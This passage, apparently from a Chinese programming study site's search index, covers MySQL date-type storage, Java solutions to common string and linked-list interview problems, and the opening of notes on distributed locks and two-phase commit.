17:53:32 | +---------------------+---------------------+ 扩展：一些关于 MySQL 时区设置的一个常用 sql 命令\n# 查看当前会话时区 SELECT @@session.time_zone; # 设置当前会话时区 SET time_zone = \u0026#39;Europe/Helsinki\u0026#39;; SET time_zone = \u0026#34;+00:00\u0026#34;; # 数据库全局时区设置 SELECT @@global.time_zone; # 设置全局时区 SET GLOBAL time_zone = \u0026#39;+8:00\u0026#39;; SET GLOBAL time_zone = \u0026#39;Europe/Helsinki\u0026#39;; 2.2 DateTime 类型耗费空间更大    Timestamp 只需要使用 4 个字节的存储空间，但是 DateTime 需要耗费 8 个字节的存储空间。但是，这样同样造成了一个问题，Timestamp 表示的时间范围更小。\n DateTime ：1000-01-01 00:00:00 ~ 9999-12-31 23:59:59 Timestamp： 1970-01-01 00:00:01 ~ 2037-12-31 23:59:59   Timestamp 在不同版本的 MySQL 中有细微差别。\n 3 再看 MySQL 日期类型存储空间    下图是 MySQL 5.6 版本中日期类型所占的存储空间：\n可以看出 5.6.4 之后的 MySQL 多出了一个需要 0 ～ 3 字节的小数位。DateTime 和 Timestamp 会有几种不同的存储空间占用。\n为了方便，本文我们还是默认 Timestamp 只需要使用 4 个字节的存储空间，但是 DateTime 需要耗费 8 个字节的存储空间。\n4.数值型时间戳是更好的选择吗？    很多时候，我们也会使用 int 或者 bigint 类型的数值也就是时间戳来表示时间。\n这种存储方式的具有 Timestamp 类型的所具有一些优点，并且使用它的进行日期排序以及对比等操作的效率会更高，跨系统也很方便，毕竟只是存放的数值。缺点也很明显，就是数据的可读性太差了，你无法直观的看到具体时间。\n时间戳的定义如下：\n 时间戳的定义是从一个基准时间开始算起，这个基准时间是「1970-1-1 00:00:00 +0:00」，从这个时间开始，用整数表示，以秒计时，随着时间的流逝这个时间整数不断增加。这样一来，我只需要一个数值，就可以完美地表示时间了，而且这个数值是一个绝对数值，即无论的身处地球的任何角落，这个表示时间的时间戳，都是一样的，生成的数值都是一样的，并且没有时区的概念，所以在系统的中时间的传输中，都不需要进行额外的转换了，只有在显示给用户的时候，才转换为字符串格式的本地时间。\n 数据库中实际操作：\nmysql\u0026gt; select UNIX_TIMESTAMP(\u0026#39;2020-01-11 09:53:32\u0026#39;); +---------------------------------------+ | UNIX_TIMESTAMP(\u0026#39;2020-01-11 09:53:32\u0026#39;) | +---------------------------------------+ | 1578707612 | +---------------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select FROM_UNIXTIME(1578707612); +---------------------------+ | FROM_UNIXTIME(1578707612) | +---------------------------+ | 2020-01-11 09:53:32 | +---------------------------+ 1 row in set (0.01 sec) 5.总结    MySQL 中时间到底怎么存储才好？Datetime?Timestamp? 数值保存的时间戳？\n好像并没有一个银弹，很多程序员会觉得数值型时间戳是真的好，效率又高还各种兼容，但是很多人又觉得它表现的不够直观。这里插一嘴，《高性能 MySQL 》这本神书的作者就是推荐 Timestamp，原因是数值表示时间不够直观。下面是原文：\n每种方式都有各自的优势，根据实际场景才是王道。下面再对这三种方式做一个简单的对比，以供大家实际开发中选择正确的存放时间的数据类型：\n如果还有什么问题欢迎给我留言！如果文章有什么问题的话，也劳烦指出，Guide 哥感激不尽！\n后面的文章我会介绍：\n Java8 对日期的支持以及为啥不能用 SimpleDateFormat。 SpringBoot 中如何实际使用(JPA 为例)  "},{"id":329,"href":"/cs-basics/algorithms/%E5%87%A0%E9%81%93%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AE%97%E6%B3%95%E9%A2%98/","title":"几道常见的字符串算法题","parent":"algorithms","content":" 说明 1. KMP 算法 2. 替换空格 3. 最长公共前缀 4. 回文串  4.1. 最长回文串 4.2. 验证回文串 4.3. 最长回文子串 4.4. 最长回文子序列   5. 括号匹配深度 6. 把字符串转换成整数   授权转载！\n 本文作者：wwwxmu 原文地址:https://www.weiweiblog.cn/13string/   考虑到篇幅问题，我会分两次更新这个内容。本篇文章只是原文的一部分，我在原文的基础上增加了部分内容以及修改了部分代码和注释。另外，我增加了爱奇艺 2018 秋招 Java：求给定合法括号序列的深度 这道题。所有代码均编译成功，并带有注释，欢迎各位享用！\n1. KMP 算法    谈到字符串问题，不得不提的就是 KMP 算法，它是用来解决字符串查找的问题，可以在一个字符串（S）中查找一个子串（W）出现的位置。KMP 算法把字符匹配的时间复杂度缩小到 O(m+n) ,而空间复杂度也只有O(m)。因为“暴力搜索”的方法会反复回溯主串，导致效率低下，而KMP算法可以利用已经部分匹配这个有效信息，保持主串上的指针不回溯，通过修改子串的指针，让模式串尽量地移动到有效的位置。\n具体算法细节请参考：\n 字符串匹配的KMP算法: http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html 从头到尾彻底理解KMP: https://blog.csdn.net/v_july_v/article/details/7041827 如何更好的理解和掌握 KMP 算法?: https://www.zhihu.com/question/21923021 KMP 算法详细解析: https://blog.sengxian.com/algorithms/kmp 图解 KMP 算法: http://blog.jobbole.com/76611/ 汪都能听懂的KMP字符串匹配算法【双语字幕】: https://www.bilibili.com/video/av3246487/?from=search\u0026amp;seid=17173603269940723925 KMP字符串匹配算法1: https://www.bilibili.com/video/av11866460?from=search\u0026amp;seid=12730654434238709250  除此之外，再来了解一下BM算法！\n BM算法也是一种精确字符串匹配算法，它采用从右向左比较的方法，同时应用到了两种启发式规则，即坏字符规则 和好后缀规则 ，来决定向右跳跃的距离。基本思路就是从右往左进行字符匹配，遇到不匹配的字符后从坏字符表和好后缀表找一个最大的右移值，将模式串右移继续匹配。 《字符串匹配的KMP算法》:http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html\n 2. 替换空格     剑指offer：请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。\n 这里我提供了两种方法：①常规方法；②利用 API 解决。\n//https://www.weiweiblog.cn/replacespace/ public class Solution { /** * 第一种方法：常规方法。利用String.charAt(i)以及String.valueOf(char).equals(\u0026#34; \u0026#34; * )遍历字符串并判断元素是否为空格。是则替换为\u0026#34;%20\u0026#34;,否则不替换 */ public static String replaceSpace(StringBuffer str) { int length = str.length(); // System.out.println(\u0026#34;length=\u0026#34; + length);  StringBuffer result = new StringBuffer(); for (int i = 0; i \u0026lt; length; i++) { char b = str.charAt(i); if (String.valueOf(b).equals(\u0026#34; \u0026#34;)) { result.append(\u0026#34;%20\u0026#34;); } else { result.append(b); } } return result.toString(); } /** * 第二种方法：利用API替换掉所用空格，一行代码解决问题 */ public static String replaceSpace2(StringBuffer str) { return str.toString().replaceAll(\u0026#34;\\\\s\u0026#34;, \u0026#34;%20\u0026#34;); } } 3. 最长公共前缀     Leetcode: 编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，返回空字符串 \u0026ldquo;\u0026quot;。\n 示例 1:\n输入: [\u0026quot;flower\u0026quot;,\u0026quot;flow\u0026quot;,\u0026quot;flight\u0026quot;] 输出: \u0026quot;fl\u0026quot; 示例 2:\n输入: [\u0026quot;dog\u0026quot;,\u0026quot;racecar\u0026quot;,\u0026quot;car\u0026quot;] 输出: \u0026quot;\u0026quot; 解释: 输入不存在公共前缀。 思路很简单！先利用Arrays.sort(strs)为数组排序，再将数组第一个元素和最后一个元素的字符从前往后对比即可！\npublic class Main { public static String replaceSpace(String[] strs) { // 如果检查值不合法及就返回空串 \tif (!checkStrs(strs)) { return \u0026#34;\u0026#34;; } // 数组长度 \tint len = strs.length; // 用于保存结果 \tStringBuilder res = new StringBuilder(); // 给字符串数组的元素按照升序排序(包含数字的话，数字会排在前面) \tArrays.sort(strs); int m = strs[0].length(); int n = strs[len - 1].length(); int num = Math.min(m, n); for (int i = 0; i \u0026lt; num; i++) { if (strs[0].charAt(i) == strs[len - 1].charAt(i)) { res.append(strs[0].charAt(i)); } else break; } return res.toString(); } private static boolean chechStrs(String[] strs) { boolean flag = false; if (strs != null) { // 遍历strs检查元素值 \tfor (int i = 0; i \u0026lt; strs.length; i++) { if (strs[i] != null \u0026amp;\u0026amp; strs[i].length() != 0) { flag = true; } else { flag = false; break; } } } return flag; } // 测试 \tpublic static void main(String[] args) { String[] strs = { \u0026#34;customer\u0026#34;, \u0026#34;car\u0026#34;, \u0026#34;cat\u0026#34; }; // String[] strs = { \u0026#34;customer\u0026#34;, \u0026#34;car\u0026#34;, null };//空串 \t// String[] strs = {};//空串 \t// String[] strs = null;//空串 \tSystem.out.println(Main.replaceSpace(strs));// c \t} } 4. 回文串    4.1. 最长回文串     LeetCode: 给定一个包含大写字母和小写字母的字符串，找到通过这些字母构造成的最长的回文串。在构造过程中，请注意区分大小写。比如\u0026quot;Aa\u0026quot;不能当做一个回文字符串。注 意:假设字符串的长度不会超过 1010。\n  回文串：“回文串”是一个正读和反读都一样的字符串，比如“level”或者“noon”等等就是回文串。——百度百科 地址：https://baike.baidu.com/item/%E5%9B%9E%E6%96%87%E4%B8%B2/1274921?fr=aladdin\n 示例 1:\n输入: \u0026quot;abccccdd\u0026quot; 输出: 7 解释: 我们可以构造的最长的回文串是\u0026quot;dccaccd\u0026quot;, 它的长度是 7。 我们上面已经知道了什么是回文串？现在我们考虑一下可以构成回文串的两种情况：\n 字符出现次数为双数的组合 字符出现次数为偶数的组合+单个字符中出现次数最多且为奇数次的字符 （参见 issue665 ）  统计字符出现的次数即可，双数才能构成回文。因为允许中间一个数单独出现，比如“abcba”，所以如果最后有字母落单，总长度可以加 1。首先将字符串转变为字符数组。然后遍历该数组，判断对应字符是否在hashset中，如果不在就加进去，如果在就让count++，然后移除该字符！这样就能找到出现次数为双数的字符个数。\n//https://leetcode-cn.com/problems/longest-palindrome/description/ class Solution { public int longestPalindrome(String s) { if (s.length() == 0) return 0; // 用于存放字符  HashSet\u0026lt;Character\u0026gt; hashset = new HashSet\u0026lt;Character\u0026gt;(); char[] chars = s.toCharArray(); int count = 0; for (int i = 0; i \u0026lt; chars.length; i++) { if (!hashset.contains(chars[i])) {// 如果hashset没有该字符就保存进去  hashset.add(chars[i]); } else {// 如果有,就让count++（说明找到了一个成对的字符），然后把该字符移除  hashset.remove(chars[i]); count++; } } return hashset.isEmpty() ? count * 2 : count * 2 + 1; } } 4.2. 验证回文串     LeetCode: 给定一个字符串，验证它是否是回文串，只考虑字母和数字字符，可以忽略字母的大小写。 说明：本题中，我们将空字符串定义为有效的回文串。\n 示例 1:\n输入: \u0026quot;A man, a plan, a canal: Panama\u0026quot; 输出: true 示例 2:\n输入: \u0026quot;race a car\u0026quot; 输出: false //https://leetcode-cn.com/problems/valid-palindrome/description/ class Solution { public boolean isPalindrome(String s) { if (s.length() == 0) return true; int l = 0, r = s.length() - 1; while (l \u0026lt; r) { // 从头和尾开始向中间遍历  if (!Character.isLetterOrDigit(s.charAt(l))) {// 字符不是字母和数字的情况  l++; } else if (!Character.isLetterOrDigit(s.charAt(r))) {// 字符不是字母和数字的情况  r--; } else { // 判断二者是否相等  if (Character.toLowerCase(s.charAt(l)) != Character.toLowerCase(s.charAt(r))) return false; l++; r--; } } return true; } } 4.3. 最长回文子串     Leetcode: LeetCode: 最长回文子串 给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为1000。\n 示例 1：\n输入: \u0026quot;babad\u0026quot; 输出: \u0026quot;bab\u0026quot; 注意: \u0026quot;aba\u0026quot;也是一个有效答案。 示例 2：\n输入: \u0026quot;cbbd\u0026quot; 输出: \u0026quot;bb\u0026quot; 以某个元素为中心，分别计算偶数长度的回文最大长度和奇数长度的回文最大长度。给大家大致花了个草图，不要嫌弃！\n//https://leetcode-cn.com/problems/longest-palindromic-substring/description/ class Solution { private int index, len; public String longestPalindrome(String s) { if (s.length() \u0026lt; 2) return s; for (int i = 0; i \u0026lt; s.length() - 1; i++) { PalindromeHelper(s, i, i); PalindromeHelper(s, i, i + 1); } return s.substring(index, index + len); } public void PalindromeHelper(String s, int l, int r) { while (l \u0026gt;= 0 \u0026amp;\u0026amp; r \u0026lt; s.length() \u0026amp;\u0026amp; s.charAt(l) == s.charAt(r)) { l--; r++; } if (len \u0026lt; r - l - 1) { index = l + 1; len = r - l - 1; } } } 4.4. 最长回文子序列     LeetCode: 最长回文子序列 给定一个字符串s，找到其中最长的回文子序列。可以假设s的最大长度为1000。 最长回文子序列和上一题最长回文子串的区别是，子串是字符串中连续的一个序列，而子序列是字符串中保持相对位置的字符序列，例如，\u0026ldquo;bbbb\u0026quot;可以是字符串\u0026quot;bbbab\u0026quot;的子序列但不是子串。\n 给定一个字符串s，找到其中最长的回文子序列。可以假设s的最大长度为1000。\n示例 1:\n输入: \u0026quot;bbbab\u0026quot; 输出: 4 一个可能的最长回文子序列为 \u0026ldquo;bbbb\u0026rdquo;。\n示例 2:\n输入: \u0026quot;cbbd\u0026quot; 输出: 2 一个可能的最长回文子序列为 \u0026ldquo;bb\u0026rdquo;。\n动态规划： dp[i][j] = dp[i+1][j-1] + 2 if s.charAt(i) == s.charAt(j) otherwise, dp[i][j] = Math.max(dp[i+1][j], dp[i][j-1])\nclass Solution { public int longestPalindromeSubseq(String s) { int len = s.length(); int [][] dp = new int[len][len]; for(int i = len - 1; i\u0026gt;=0; i--){ dp[i][i] = 1; for(int j = i+1; j \u0026lt; len; j++){ if(s.charAt(i) == s.charAt(j)) dp[i][j] = dp[i+1][j-1] + 2; else dp[i][j] = Math.max(dp[i+1][j], dp[i][j-1]); } } return dp[0][len-1]; } } 5. 括号匹配深度     爱奇艺 2018 秋招 Java： 一个合法的括号匹配序列有以下定义:\n 空串\u0026quot;\u0026ldquo;是一个合法的括号匹配序列 如果\u0026quot;X\u0026quot;和\u0026quot;Y\u0026quot;都是合法的括号匹配序列,\u0026ldquo;XY\u0026quot;也是一个合法的括号匹配序列 如果\u0026quot;X\u0026quot;是一个合法的括号匹配序列,那么\u0026rdquo;(X)\u0026ldquo;也是一个合法的括号匹配序列 每个合法的括号序列都可以由以上规则生成。    例如: \u0026ldquo;\u0026rdquo;,\u0026quot;()\u0026rdquo;,\u0026quot;()()\u0026rdquo;,\u0026quot;((()))\u0026ldquo;都是合法的括号序列 对于一个合法的括号序列我们又有以下定义它的深度:\n 空串\u0026quot;\u0026ldquo;的深度是0 如果字符串\u0026quot;X\u0026quot;的深度是x,字符串\u0026quot;Y\u0026quot;的深度是y,那么字符串\u0026quot;XY\u0026quot;的深度为max(x,y) 如果\u0026quot;X\u0026quot;的深度是x,那么字符串\u0026rdquo;(X)\u0026ldquo;的深度是x+1    例如: \u0026ldquo;()()()\u0026ldquo;的深度是1,\u0026quot;((()))\u0026ldquo;的深度是3。牛牛现在给你一个合法的括号序列,需要你计算出其深度。\n 输入描述: 输入包括一个合法的括号序列s,s长度length(2 ≤ length ≤ 50),序列中只包含'('和')'。 输出描述: 输出一个正整数,即这个序列的深度。 示例：\n输入: (()) 输出: 2 思路草图：\n代码如下：\nimport java.util.Scanner; /** * https://www.nowcoder.com/test/8246651/summary * * @author Snailclimb * @date 2018年9月6日 * @Description: TODO 求给定合法括号序列的深度 */ public class Main { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String s = sc.nextLine(); int cnt = 0, max = 0, i; for (i = 0; i \u0026lt; s.length(); ++i) { if (s.charAt(i) == \u0026#39;(\u0026#39;) cnt++; else cnt--; max = Math.max(max, cnt); } sc.close(); System.out.println(max); } } 6. 把字符串转换成整数     剑指offer: 将一个字符串转换成一个整数(实现Integer.valueOf(string)的功能，但是string不符合数字要求时返回0)，要求不能使用字符串转换整数的库函数。 数值为0或者字符串不是一个合法的数值则返回0。\n //https://www.weiweiblog.cn/strtoint/ public class Main { public static int StrToInt(String str) { if (str.length() == 0) return 0; char[] chars = str.toCharArray(); // 判断是否存在符号位  int flag = 0; if (chars[0] == \u0026#39;+\u0026#39;) flag = 1; else if (chars[0] == \u0026#39;-\u0026#39;) flag = 2; int start = flag \u0026gt; 0 ? 1 : 0; int res = 0;// 保存结果  for (int i = start; i \u0026lt; chars.length; i++) { if (Character.isDigit(chars[i])) {// 调用Character.isDigit(char)方法判断是否是数字，是返回True，否则False  int temp = chars[i] - \u0026#39;0\u0026#39;; res = res * 10 + temp; } else { return 0; } } return flag != 2 ? res : -res; } public static void main(String[] args) { // TODO Auto-generated method stub  String s = \u0026#34;-12312312\u0026#34;; System.out.println(\u0026#34;使用库函数转换：\u0026#34; + Integer.valueOf(s)); int res = Main.StrToInt(s); System.out.println(\u0026#34;使用自己写的方法转换：\u0026#34; + res); } } "},{"id":330,"href":"/cs-basics/algorithms/%E5%87%A0%E9%81%93%E5%B8%B8%E8%A7%81%E7%9A%84%E9%93%BE%E8%A1%A8%E7%AE%97%E6%B3%95%E9%A2%98/","title":"几道常见的链表算法题","parent":"algorithms","content":" 1. 两数相加  题目描述 问题分析 Solution   2. 翻转链表  题目描述 问题分析 Solution   3. 链表中倒数第k个节点  题目描述 问题分析 Solution   4. 删除链表的倒数第N个节点  问题分析 Solution   5. 合并两个排序的链表  题目描述 问题分析 Solution    1. 两数相加    题目描述     Leetcode:给定两个非空链表来表示两个非负整数。位数按照逆序方式存储，它们的每个节点只存储单个数字。将两数相加返回一个新的链表。\n你可以假设除了数字 0 之外，这两个数字都不会以零开头。\n 示例：\n输入：(2 -\u0026gt; 4 -\u0026gt; 3) + (5 -\u0026gt; 6 -\u0026gt; 4) 输出：7 -\u0026gt; 0 -\u0026gt; 8 原因：342 + 465 = 807 问题分析    Leetcode官方详细解答地址：\nhttps://leetcode-cn.com/problems/add-two-numbers/solution/\n 要对头结点进行操作时，考虑创建哑节点dummy，使用dummy-\u0026gt;next表示真正的头节点。这样可以避免处理头节点为空的边界问题。\n 我们使用变量来跟踪进位，并从包含最低有效位的表头开始模拟逐 位相加的过程。\nSolution    我们首先从最低有效位也就是列表 l1和 l2 的表头开始相加。注意需要考虑到进位的情况！\n/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ //https://leetcode-cn.com/problems/add-two-numbers/description/ class Solution { public ListNode addTwoNumbers(ListNode l1, ListNode l2) { ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; //carry 表示进位数  int carry = 0; while (p != null || q != null) { int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; //进位数  carry = sum / 10; //新节点的数值为sum % 10  curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; } if (carry \u0026gt; 0) { curr.next = new ListNode(carry); } return dummyHead.next; } } 2. 翻转链表    题目描述     剑指 offer:输入一个链表，反转链表后，输出链表的所有元素。\n 问题分析    这道算法题，说直白点就是：如何让后一个节点指向前一个节点！在下面的代码中定义了一个 next 节点，该节点主要是保存要反转到头的那个节点，防止链表 “断裂”。\nSolution    public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } } /** * * @author Snailclimb * @date 2018年9月19日 * @Description: TODO */ public class Solution { public ListNode ReverseList(ListNode head) { ListNode next = null; ListNode pre = null; while (head != null) { // 保存要反转到头的那个节点  next = head.next; // 要反转的那个节点指向已经反转的上一个节点(备注:第一次反转的时候会指向null)  head.next = pre; // 上一个已经反转到头部的节点  pre = head; // 一直向链表尾走  head = next; } return pre; } } 测试方法：\npublic static void main(String[] args) { ListNode a = new ListNode(1); ListNode b = new ListNode(2); ListNode c = new ListNode(3); ListNode d = new ListNode(4); ListNode e = new ListNode(5); a.next = b; b.next = c; c.next = d; d.next = e; new Solution().ReverseList(a); while (e != null) { System.out.println(e.val); e = e.next; } } 输出：\n5 4 3 2 1 3. 链表中倒数第k个节点    题目描述     剑指offer: 输入一个链表，输出该链表中倒数第k个结点。\n 问题分析     链表中倒数第k个节点也就是正数第(L-K+1)个节点，知道了只一点，这一题基本就没问题！\n 首先两个节点/指针，一个节点 node1 先开始跑，指针 node1 跑到 k-1 个节点后，另一个节点 node2 开始跑，当 node1 跑到最后时，node2 所指的节点就是倒数第k个节点也就是正数第(L-K+1)个节点。\nSolution    /* public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } }*/ // 时间复杂度O(n),一次遍历即可 // https://www.nowcoder.com/practice/529d3ae5a407492994ad2a246518148a?tpId=13\u0026amp;tqId=11167\u0026amp;tPage=1\u0026amp;rp=1\u0026amp;ru=/ta/coding-interviews\u0026amp;qru=/ta/coding-interviews/question-ranking public class Solution { public ListNode FindKthToTail(ListNode head, int k) { // 如果链表为空或者k小于等于0  if (head == null || k \u0026lt;= 0) { return null; } // 声明两个指向头结点的节点  ListNode node1 = head, node2 = head; // 记录节点的个数  int count = 0; // 记录k值，后面要使用  int index = k; // p指针先跑，并且记录节点数，当node1节点跑了k-1个节点后，node2节点开始跑，  // 当node1节点跑到最后时，node2节点所指的节点就是倒数第k个节点  while (node1 != null) { node1 = node1.next; count++; if (k \u0026lt; 1) { node2 = node2.next; } k--; } // 如果节点个数小于所求的倒数第k个节点，则返回空  if (count \u0026lt; index) return null; return node2; } } 4. 删除链表的倒数第N个节点     Leetcode:给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。\n 示例：\n给定一个链表: 1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;5, 和 n = 2. 当删除了倒数第二个节点后，链表变为 1-\u0026gt;2-\u0026gt;3-\u0026gt;5. 说明：\n给定的 n 保证是有效的。\n进阶：\n你能尝试使用一趟扫描实现吗？\n该题在 leetcode 上有详细解答，具体可参考 Leetcode.\n问题分析    我们注意到这个问题可以容易地简化成另一个问题：删除从列表开头数起的第 (L - n + 1)个结点，其中 L是列表的长度。只要我们找到列表的长度 L，这个问题就很容易解决。\nSolution    两次遍历法\n首先我们将添加一个 哑结点 作为辅助，该结点位于列表头部。哑结点用来简化某些极端情况，例如列表中只含有一个结点，或需要删除列表的头部。在第一次遍历中，我们找出列表的长度 L。然后设置一个指向哑结点的指针，并移动它遍历列表，直至它到达第 (L - n) 个结点那里。我们把第 (L - n)个结点的 next 指针重新链接至第 (L - n + 2)个结点，完成这个算法。\n/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ // https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/description/ public class Solution { public ListNode removeNthFromEnd(ListNode head, int n) { // 哑结点，哑结点用来简化某些极端情况，例如列表中只含有一个结点，或需要删除列表的头部  ListNode dummy = new ListNode(0); // 哑结点指向头结点  dummy.next = head; // 保存链表长度  int length = 0; ListNode len = head; while (len != null) { length++; len = len.next; } length = length - n; ListNode target = dummy; // 找到 L-n 位置的节点  while (length \u0026gt; 0) { target = target.next; length--; } // 把第 (L - n)个结点的 next 指针重新链接至第 (L - n + 2)个结点  target.next = target.next.next; return dummy.next; } } 复杂度分析：\n 时间复杂度 O(L) ：该算法对列表进行了两次遍历，首先计算了列表的长度 LL 其次找到第 (L - n)(L−n) 个结点。 操作执行了 2L-n2L−n 步，时间复杂度为 O(L)O(L)。 空间复杂度 O(1) ：我们只用了常量级的额外空间。  进阶——一次遍历法：\n 链表中倒数第N个节点也就是正数第(L-N+1)个节点。\n 其实这种方法就和我们上面第四题找“链表中倒数第k个节点”所用的思想是一样的。基本思路就是： 定义两个节点 node1、node2;node1 节点先跑，node1节点 跑到第 n+1 个节点的时候,node2 节点开始跑.当node1 节点跑到最后一个节点时，node2 节点所在的位置就是第 （L-n ） 个节点（L代表总链表长度，也就是倒数第 n+1 个节点）\n/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ public class Solution { public ListNode removeNthFromEnd(ListNode head, int n) { ListNode dummy = new ListNode(0); dummy.next = head; // 声明两个指向头结点的节点  ListNode node1 = dummy, node2 = dummy; // node1 节点先跑，node1节点 跑到第 n 个节点的时候,node2 节点开始跑  // 当node1 节点跑到最后一个节点时，node2 节点所在的位置就是第 （L-n ） 个节点，也就是倒数第 n+1（L代表总链表长度）  while (node1 != null) { node1 = node1.next; if (n \u0026lt; 1 \u0026amp;\u0026amp; node1 != null) { node2 = node2.next; } n--; } node2.next = node2.next.next; return dummy.next; } } 5. 合并两个排序的链表    题目描述     剑指offer:输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。\n 问题分析    我们可以这样分析:\n 假设我们有两个链表 A,B； A的头节点A1的值与B的头结点B1的值比较，假设A1小，则A1为头节点； A2再和B1比较，假设B1小,则，A1指向B1； A2再和B2比较 就这样循环往复就行了，应该还算好理解。  考虑通过递归的方式实现！\nSolution    递归版本：\n/* public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } }*/ //https://www.nowcoder.com/practice/d8b6b4358f774294a89de2a6ac4d9337?tpId=13\u0026amp;tqId=11169\u0026amp;tPage=1\u0026amp;rp=1\u0026amp;ru=/ta/coding-interviews\u0026amp;qru=/ta/coding-interviews/question-ranking public class Solution { public ListNode Merge(ListNode list1,ListNode list2) { if(list1 == null){ return list2; } if(list2 == null){ return list1; } if(list1.val \u0026lt;= list2.val){ list1.next = Merge(list1.next, list2); return list1; }else{ list2.next = Merge(list1, list2.next); return list2; } } } "},{"id":331,"href":"/%E7%AC%94%E8%AE%B0/%E5%88%86%E5%B8%83%E5%BC%8F/","title":"分布式","parent":"笔记","content":"分布式     分布式  一、分布式锁  数据库的唯一索引 Redis 的 SETNX 指令 Redis 的 RedLock 算法 Zookeeper 的有序节点   二、分布式事务  2PC 本地消息表   三、CAP  一致性 可用性 分区容忍性 权衡   四、BASE  基本可用 软状态 最终一致性   五、Paxos  执行过程 约束条件   六、Raft  单个 Candidate 的竞选 多个 Candidate 竞选 数据同步   参考    一、分布式锁    在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。\n阻塞锁通常使用互斥量来实现：\n 互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。  1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。\n数据库的唯一索引    获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。\n存在以下几个问题：\n 锁没有失效时间，解锁失败的话其它进程无法再获得该锁； 只能是非阻塞锁，插入失败直接就报错了，无法重试； 不可重入，已经获得锁的进程也必须重新获取锁。  Redis 的 SETNX 指令    使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。\nSETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。\nEXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。\nRedis 的 RedLock 算法    使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。\n 尝试从 N 个互相独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，才认为获取锁成功； 如果获取锁失败，就到每个实例上释放锁。  Zookeeper 的有序节点    1. Zookeeper 抽象模型    Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。\n\n2. 节点类型     永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。  3. 监听器    为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。\n4. 分布式锁实现     创建一个锁目录 /lock； 当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。  5. 会话超时    如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，这种实现方式不会出现数据库的唯一索引实现方式释放锁失败的问题。\n6. 羊群效应    一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应，一只羊动起来，其它羊也会一哄而上），而我们只希望它的后一个子节点收到通知。\n二、分布式事务    指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。\n例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。\n分布式锁和分布式事务区别：\n 锁问题的关键在于进程操作的互斥关系，例如多个进程同时修改账户的余额，如果没有互斥关系则会导致该账户的余额不正确。 而事务问题的关键则在于事务涉及的一系列操作需要满足 ACID 特性，例如要满足原子性操作则需要这些操作要么都执行，要么都不执行。  2PC    两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。\n1. 运行过程    1.1 准备阶段    协调者询问参与者事务是否执行成功，参与者发回事务执行结果。询问可以看成一种投票，需要参与者都同意才能执行。\n\n1.2 提交阶段    如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。\n需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。\n\n2. 存在的问题    2.1 同步阻塞    所有事务参与者在等待其它参与者响应的时候都处于同步阻塞等待状态，无法进行其它操作。\n2.2 单点问题    协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在提交阶段发生故障，所有参与者会一直同步阻塞等待，无法完成其它操作。\n2.3 数据不一致    